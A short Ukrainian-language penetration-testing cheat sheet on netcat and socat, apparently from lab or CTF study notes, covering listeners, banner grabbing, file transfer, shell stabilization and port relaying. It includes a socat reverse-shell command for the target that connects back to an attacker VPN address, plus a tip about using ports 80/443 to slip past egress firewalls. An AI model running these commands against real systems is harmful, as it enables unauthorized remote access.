# Cheatsheet: Netcat / Socat

Listener для reverse shell, banner grab, передача файлів. ← [initial-access](../01-roadmaps/initial-access.md) · [revshells](webshells-revshells.md)

## Netcat — listener (прийом reverse shell)
```bash
nc -lvnp 4444          # -l слухати -v verbose -n без DNS -p порт
# listener на VPN-адресі 10.8.N.x, НЕ на 127.0.0.1
```

## Banner grab / ручне підключення
```bash
nc -nv $TARGET 25           # SMTP banner
nc -nv $TARGET 8080         # далі руками: GET / HTTP/1.0 <Enter><Enter>
```

## Передача файлів
```bash
# приймач:    nc -lvnp 9001 > file
# відправник: nc 10.8.N.x 9001 < file
```

## Стабілізація отриманого shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, далі:
export TERM=xterm; export SHELL=/bin/bash
# розмір терміналу (щоб не ламався vim/less): stty rows 50 cols 200
```

## Socat (надійніший, повний TTY)
```bash
# локально (listener):
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# на ЦІЛІ (якщо є socat):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.8.N.x:4444
```
Port-relay (пробросити внутрішній порт назовні):
```bash
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
```

## Пастки
- Shell не приходить → listener на localhost замість VPN-адреси, або payload з неправильним IP.
- Firewall на вихід → порти 80/443 у payload.
- `nc` без `-e` на цілі → mkfifo-варіант ([revshells](webshells-revshells.md)).
